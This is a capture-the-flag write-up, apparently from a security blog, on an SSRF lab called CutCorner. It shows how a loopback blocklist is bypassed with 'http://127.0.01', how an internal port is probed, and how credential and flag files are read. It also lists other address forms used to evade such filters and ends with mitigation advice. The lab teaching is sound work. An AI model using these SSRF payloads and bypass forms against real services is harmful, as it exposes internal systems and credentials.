---
title: "SSRF Blocklist Bypass – Internal File Disclosure via Localhost Filtering Evasion | CutCorner"
date: 2026-05-22 22:40:00 +0530
categories: [A01 - Broken Access Control, SSRF]
tags: [ssrf, blocklist-bypass, localhost-bypass, internal-service-discovery, file-disclosure, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/cutcorner.webp
  alt: CutCorner WebVerse challenge
---

# Lab Link

Lab: [CutCorner](https://dashboard.webverselabs-pro.com/mystery-challenges/cutcorner)

# Overview

The **CutCorner** challenge demonstrates a **Server-Side Request Forgery (SSRF)** vulnerability combined with an insufficient blacklist implementation.

The application included a URL fetching feature intended for loading internal resources inside a "Resource Hub". To prevent access to localhost resources, a filtering mechanism attempted to block requests targeting private and loopback addresses.

However, the protection relied on simple blacklist matching and failed to account for alternative representations of loopback addresses.

By bypassing the localhost filter and accessing an internal service listening on a non-standard port, sensitive files became accessible.

# Objective

Exploit the URL fetcher to access internal resources and retrieve the flag.

# Vulnerability Classification Hierarchy

```text
OWASP Category
└── A10: Server-Side Request Forgery (SSRF)
    └── SSRF
        └── Blocklist Validation Bypass
            └── Alternate Loopback Address Representation
```

# Reconnaissance

The application accepted external URLs through:

```text
https://32ce1e64-4065-cutcorner-1f944.events.webverselabs-pro.com/?url=channels/general/
```

The `url` parameter immediately suggested possible SSRF behavior because the application appeared to retrieve content on behalf of the user.

Initial testing targeted localhost:

```text
?url=http://127.0.0.1
```

Response:

```html
<div class="viewer-result viewer-error">
    <div class="result-bar">
      <span class="result-tag error-tag">ERROR</span>
      <span class="result-url mono">
      http://127.0.0.1
      </span>
    </div>

<pre class="result-body error-body">
Private/loopback addresses not allowed
</pre>
</div>
```

The application detected localhost and blocked access.

This confirmed:

- Requests were being processed server-side
- Localhost filtering existed
- SSRF protections relied on address validation

# Filter Bypass

Simple blacklist implementations often only compare exact string values.

An alternate loopback representation was used:

```text
url=http://127.0.01
```

Instead of rejecting the request, the application returned a successful response:

```html
<title>#general · CutCorner</title>
```

The alternate notation bypassed the localhost restriction.

The application resolved:

```text
127.0.01
```

to:

```text
127.0.0.1
```

while the filter failed to recognize it.

# Internal Service Discovery

After confirming localhost access, internal ports were tested.

Request:

```text
url=http://127.0.01:3000
```

Response:

```html
<!DOCTYPE HTML>

<html lang="en">

<head>
<title>Directory listing for /</title>
</head>

<body>

<h1>Directory listing for /</h1>

<hr>

<ul>
<li><a href="creds.txt">creds.txt</a></li>
<li><a href="flag.txt">flag.txt</a></li>
<li><a href="notes.txt">notes.txt</a></li>
</ul>

<hr>

</body>
</html>
```

The internal service exposed directory indexing.

Several interesting files were visible:

```text
creds.txt
flag.txt
notes.txt
```

# Exploitation

The SSRF vulnerability was used to access internal files directly.

Requests:

```text
url=http://127.0.01:3000/creds.txt

url=http://127.0.01:3000/flag.txt

url=http://127.0.01:3000/notes.txt
```

The vulnerable URL fetcher retrieved internal resources on behalf of the attacker.

# Proof of Exploitation

Sensitive internal files became readable through SSRF.

Attack path:

```text
URL Fetcher
        ↓
SSRF Detection
        ↓
Loopback Filter Bypass
        ↓
Internal Port Discovery
        ↓
Directory Enumeration
        ↓
Sensitive File Access
```

The retrieved internal resources exposed the flag:

```text
WEBVERSE{.....}
```

# Root Cause

The application likely implemented filtering similar to:

```javascript
if(url.includes("127.0.0.1"))
{
    block();
}
```

The validation relied on string matching rather than validating resolved IP addresses.

The application failed to:

- Normalize addresses
- Resolve hostnames
- Validate post-resolution IPs
- Restrict destination networks

Alternative loopback forms bypassed protection.

# Impact

In real-world environments SSRF can lead to:

- Internal service discovery
- Cloud metadata access
- Credential theft
- Internal API access
- Local file retrieval
- Container compromise
- Remote code execution chains

In cloud environments, SSRF frequently leads to:

```text
AWS metadata exposure
GCP metadata exposure
Azure credential theft
```

# Mitigation

## Use allowlists instead of blocklists

Bad:

```javascript
deny = [
    "127.0.0.1",
    "localhost"
]
```

Secure:

```javascript
allow = [
    trusted-domain.com
]
```

## Resolve and validate destination IPs

Perform validation after DNS resolution:

```text
Input URL
     ↓
Resolve hostname
     ↓
Check actual IP
     ↓
Allow or deny
```

## Block internal network ranges

Restrict:

```text
127.0.0.0/8
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.0.0/16
```

## Disable unnecessary internal exposure

Internal services should not expose:

```text
Directory listing
Unauthenticated files
Sensitive resources
```

# Real-World Insight

Developers commonly implement blacklist rules such as:

```text
Block localhost
Block 127.0.0.1
Block internal IPs
```

Attackers frequently bypass these filters using:

```text
127.0.01
127.1
0
2130706433
0x7f000001
localhost aliases
IPv6 formats
DNS rebinding
```

String matching is rarely sufficient for SSRF protection.

Security decisions should always occur after destination resolution.